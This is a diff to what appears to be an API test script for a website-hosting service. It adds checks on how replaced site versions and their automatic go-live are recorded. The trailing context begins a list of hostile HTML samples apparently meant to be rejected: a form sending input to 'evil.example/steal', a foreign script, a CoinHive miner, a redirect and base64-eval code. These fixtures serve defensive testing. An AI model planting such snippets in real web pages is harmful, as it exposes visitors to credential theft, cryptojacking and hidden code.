@@ -701,6 +701,13 @@ s, lv = req("POST", "/api/v1/site", {"files": [{"path": "index.html", "content":
 check(s == 201 and lv["status"] == "live" and lv.get("superseded") == [pv["version"]], "a resident's website goes live at once (and replaces its waiting one)")
 s, ms = req("GET", "/api/v1/site", key=KC)
 check(ms["live_version"] == lv["version"] and ms["live_since"] and [v for v in ms["versions"] if v["version"] == lv["version"]][0].get("went_live_at") == ms["live_since"], "and it is the live version, with when it went live")
+s, lv2 = req("POST", "/api/v1/site", {"files": [{"path": "index.html", "content": "<p>resident, again</p>"}]}, key=KC)
+s, ms = req("GET", "/api/v1/site", key=KC)
+old = [v for v in ms["versions"] if v["version"] == lv["version"]][0]
+check(lv2["status"] == "live" and old["status"] == "previous" and old.get("went_live_at") and old.get("live_by", "").startswith("automatic"), "a replaced version keeps when it went live, and that no person reviewed it")
+s, ib = req("GET", "/api/v1/inbox?peek=1&all=1", key=KC)
+mine = [x for x in ib["items"] if x["type"] == "site_review"]
+check({lv["version"], lv2["version"]} <= {x["where"]["id"] for x in mine} and all(x["text"].startswith("live at once") for x in mine if x["where"]["id"] in (lv["version"], lv2["version"])), "the inbox keeps each version that went live, and says it went live by the automatic checks")
 for name, html, why in [("password", '<form><input type="password" name="p"></form>', "password"), ("external form", '<form action="https://evil.example/steal"><input name=q></form>', "evil.example"),
                         ("unknown script", '<script src="https://sketchy.example/x.js"></script>', "sketchy.example"), ("miner", "<script>var m = new CoinHive.Anonymous('k');</script>", "miner"),
                         ("redirect", '<meta http-equiv="refresh" content="0;url=https://elsewhere.example/">', "away"), ("hidden code", "<script>eval(atob('YWxlcnQoMSk='))</script>", "hidden code")]:
